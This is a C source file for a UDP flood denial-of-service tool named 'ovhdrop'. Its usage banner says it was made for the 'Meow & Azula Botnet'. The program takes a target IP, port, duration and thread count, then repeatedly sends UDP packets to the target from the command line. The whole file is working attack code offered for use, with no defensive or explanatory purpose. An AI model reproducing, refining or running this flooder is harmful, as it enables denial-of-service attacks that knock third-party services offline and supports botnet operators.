#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>
#include <pthread.h>

#define MAX_PAYLOAD_SIZE 1024
#define TRUE 1
#define FALSE 0

typedef uint16_t port_t;
typedef uint8_t BOOL;

struct attack_target {
    uint32_t addr;
    uint8_t netmask;
    struct sockaddr_in sock_addr;
};

struct attack_params {
    uint8_t targs_len;
    struct attack_target *targs;
    int attack_duration;
    int threads;
};

uint32_t rand_next();
void rand_str(char *data, int len);
void *attack_method_ovhdrop(void *args);

uint32_t rand_next() {
    static uint32_t seed = 0;
    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
    return seed;
}

void rand_str(char *data, int len) {
    for (int i = 0; i < len; i++) {
        data[i] = rand_next() % 256;
    }
}

void *attack_method_ovhdrop(void *args) {
    struct attack_params *params = (struct attack_params *)args;
    int i;
    char **pkts = calloc(params->targs_len, sizeof(char *));
    int *fds = calloc(params->targs_len, sizeof(int));
    port_t sport = rand_next();
    struct sockaddr_in bind_addr = {0};

    for (i = 0; i < params->targs_len; i++) {
        pkts[i] = calloc(65535, sizeof(char));
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
            perror("socket");
            return NULL;
        }

        int optval = 1;
        setsockopt(fds[i], SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(rand_next() % 65535); 
        bind_addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1) {
            perror("bind");
            close(fds[i]);  
            continue;      
        }

        if (connect(fds[i], (struct sockaddr *)&params->targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1) {
            perror("connect");
            close(fds[i]);  
            continue;
        }
    }


    time_t start_time = time(NULL);
    while (1) {
        for (i = 0; i < params->targs_len; i++) {
            send(fds[i], pkts[i], MAX_PAYLOAD_SIZE / 2, MSG_NOSIGNAL);
        }

        if (params->attack_duration > 0 && (time(NULL) - start_time) >= params->attack_duration) {
            break;
        }
    }

    for (i = 0; i < params->targs_len; i++) {
        close(fds[i]);
        free(pkts[i]);
    }
    free(pkts);
    free(fds);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {

        printf("Method made by @f1pp or @wifiexploiter\n");
        printf("Made for the Meow & Azula Botnet \n");
        printf("Usage: %s IP PORT TIME THREADS\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int attack_duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    struct attack_target targ;
    targ.addr = inet_addr(ip);
    targ.netmask = 24;
    targ.sock_addr.sin_family = AF_INET;
    targ.sock_addr.sin_port = htons(port);
    targ.sock_addr.sin_addr.s_addr = inet_addr(ip);

    struct attack_params params;
    params.targs_len = 1;
    params.targs = &targ;
    params.attack_duration = attack_duration;
    params.threads = threads;

    pthread_t thread_id;
    pthread_create(&thread_id, NULL, attack_method_ovhdrop, (void *)&params);
    pthread_join(thread_id, NULL);

    return 0;
}
